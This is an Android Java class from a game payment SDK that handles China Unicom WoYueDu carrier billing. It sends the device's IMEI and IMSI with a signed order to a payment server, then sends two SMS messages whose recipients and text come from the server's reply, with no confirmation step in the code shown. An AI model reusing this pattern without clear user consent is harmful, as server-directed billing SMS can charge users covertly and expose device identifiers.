package mobi.zty.pay.sdk.woyuedu;

import java.net.URLEncoder;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Base64;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * 联通沃阅读 支付管理类
 * @author Administrator
 *
 */
public class WoYueDuInstance extends PaymentInterf{
	private static WoYueDuInstance instance;
	private Handler callBHandler = null;
	private String createtime;
	public static WoYueDuInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized WoYueDuInstance scyMMpay(){
		if(instance==null){
			instance =  new WoYueDuInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String orderid = (String) parameters[0];   //6订单号
		final int feeIndex = (Integer) parameters[1];
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		
		final String merid = mkInfo.spIdentify;  //5商户唯一标识
		final String goodsid = feeInfo.payCode;  //2计费点
		final String imsi = Helper.getIMSI(context);  //4
		final String imei = Helper.getIMEI(context);  //3
		final String appname = mkInfo.appName;//应用名
		final String pay_url = mkInfo.payUrl1;//支付请求的url
		final String notifyurl = mkInfo.payUrl2;//支付回调地址
		final String secret = mkInfo.spKey;//签名密码
		final String spSignType = mkInfo.spSignType;//签名类型
		final String subject = feeInfo.name;//商品名
		
		createtime = new java.text.SimpleDateFormat("yyyyMMddHHmmss").format(new java.util.Date());   //1时间
			new Thread(new Runnable() {
				@Override
				public void run() {
					PayResultInfo info = new PayResultInfo();
					info.index = feeIndex;
					try {
						String express = "createtime="+createtime+"&goodsid="+goodsid+"&imei="+imei+"&imsi="+imsi
								+"&merid="+merid+"&orderid="+orderid;
						byte[] b = Helper.hmac_sha1(express, secret,spSignType);
						String sign = URLEncoder.encode(Base64.encodeBytes(b), "UTF-8");
						
						String url = pay_url+"?sign="+sign+"&appname="+URLEncoder.encode(appname, "UTF-8")+"&goodsid="+goodsid+"&imsi="+imsi+
								"&imei="+imei+"&orderid="+orderid+"&merid="+merid+"&createtime="+
								 
								createtime+"&notifyurl="+URLEncoder.encode(notifyurl, "UTF-8")+"&subject="+
								URLEncoder.encode(subject, "UTF-8");
						String requestResponse = HttpRequestt.get(url).body();
						boolean isSendMsg = false;
						if (requestResponse!=null && requestResponse!="") {
							JSONObject ret = new JSONObject(requestResponse);
							Util_G.debugE("woyuedu_pay", "retcode->"+ret.getString("retcode"));
							if (ret.getString("retcode").equals("0000"))  {//请求成功
								String sms1 = ret.getString("sms1");
								String sms2 = ret.getString("sms2");
								String accessno1 = ret.getString("accessno1");
								String accessno2 = ret.getString("accessno2");
								Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
								itSend.putExtra("fee_index", feeIndex);
						        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   

						        Util_G.sendTextMessage(context, accessno1, sms1, mSendPI, 0);
						        Util_G.sendTextMessage(context, accessno2, sms2, mSendPI, 0);
								isSendMsg = true;
							}
						} 
						if (!isSendMsg) {
							info.resutCode = PayConfig.SP_PAY_FAIL;
							info.retMsg = "支付失败";
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							return;
						}
				    	
					} catch (Exception e) {
						info.resutCode = PayConfig.SP_PAY_EXPTION;
						info.retMsg = "支付失败";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						e.printStackTrace();
					}
				}
			}).start();;
	}
	
}
